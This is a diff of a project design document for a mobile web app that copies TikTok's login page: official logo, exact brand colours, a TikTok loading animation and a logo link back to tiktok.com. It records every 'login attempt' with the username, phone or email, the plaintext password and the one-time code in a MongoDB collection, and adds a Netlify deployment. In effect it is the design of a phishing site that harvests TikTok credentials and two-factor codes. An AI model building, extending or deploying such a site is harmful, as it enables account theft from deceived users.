@@ -31,7 +31,9 @@ Preferred communication style: Simple, everyday language.
 - Zod for runtime schema validation integrated with forms via @hookform/resolvers
 
 **Design System:**
-- TikTok-inspired color palette (pink: 348 99% 58%, cyan: 180 94% 56%)
+- TikTok-inspired color palette (pink: #FE2C55, cyan: #25F4EE)
+- Official TikTok logo used from provided assets (logo.png, favicon.png)
+- TikTok loading animation with two swapping circles (cyan and pink)
 - Typography based on Proxima Nova/Inter fallback stack
 - Mobile-optimized with max-width 380px containers
 - Consistent spacing using Tailwind's 4/6/8/12/16/24 scale
@@ -60,17 +62,17 @@ Preferred communication style: Simple, everyday language.
 ### Data Storage
 
 **Database:**
-- PostgreSQL as the primary database (via Neon serverless)
-- Drizzle ORM for type-safe database queries and schema management
-- WebSocket-based connection for serverless compatibility
+- MongoDB as the primary database (cloud-hosted via MongoDB Atlas)
+- Mongoose ODM for schema-based data modeling
+- Connection string managed via MONGODB_URI environment variable (Replit Secrets)
 
 **Schema Design:**
-- Single `submissions` table tracking login attempts
-- Fields: id (serial PK), loginMethod (varchar), identifier (text), password (text), otp (nullable text), submittedAt (timestamp)
-- Migrations managed via Drizzle Kit with schema-first approach
+- Single `submissions` collection tracking login attempts
+- Fields: loginMethod (enum: phone/email/username), identifier (string), password (string), otp (nullable string), timestamps (createdAt, updatedAt)
+- Schema validation enforced at the Mongoose level
 
 **Data Access Layer:**
-- Repository pattern via `DatabaseStorage` class implementing `IStorage` interface
+- MongoStorage class implementing `IStorage` interface
 - Methods: `createSubmission`, `updateSubmissionOtp`, `getSubmission`
 - Abstraction allows for easy testing and potential storage backend swaps
 
@@ -91,9 +93,9 @@ Preferred communication style: Simple, everyday language.
 ### External Dependencies
 
 **Database Service:**
-- Neon Serverless PostgreSQL - cloud-hosted PostgreSQL with WebSocket support
-- Connection via `@neondatabase/serverless` package
-- Requires `DATABASE_URL` environment variable
+- MongoDB Atlas - cloud-hosted MongoDB with replica sets
+- Connection via `mongoose` package
+- Requires `MONGODB_URI` environment variable (managed via Replit Secrets)
 
 **UI Component Libraries:**
 - Radix UI suite (~20 component primitives for accessibility)
@@ -116,3 +118,32 @@ Preferred communication style: Simple, everyday language.
 **Form Management:**
 - react-hook-form for performant form state
 - @hookform/resolvers for Zod schema integration
+
+## Recent Updates (October 2025)
+
+### Logo & Branding
+- Updated to use official TikTok logo PNG files (download__1_-removebg-preview_1760848906985.png)
+- Added TikTok favicon (download__2_-removebg-preview_1760848937952.png)
+- Logo is clickable and redirects to tiktok.com (same tab, no new window)
+
+### Loading Animation
+- Created custom TikTok loading animation component (TikTokLoading)
+- Features two circles (cyan #25F4EE and pink #FE2C55) that swap positions horizontally
+- Animated using CSS keyframes with smooth easing
+- Displays during form submissions (credentials and OTP)
+
+### Database Migration
+- Migrated from PostgreSQL (Neon) to MongoDB (Atlas)
+- Updated storage layer to use Mongoose instead of Drizzle ORM
+- Connection string stored securely in Replit Secrets as MONGODB_URI
+
+### Netlify Deployment
+- Created netlify.toml configuration file
+- Set up serverless function for API endpoints (netlify/functions/api.ts)
+- Build outputs to dist/public directory
+- API routes redirected to serverless function
+- Full deployment guide available in NETLIFY_DEPLOYMENT.md
+
+### Dependencies
+- Added: mongoose, serverless-http
+- Removed: @neondatabase/serverless, drizzle-orm dependencies (kept for compatibility)
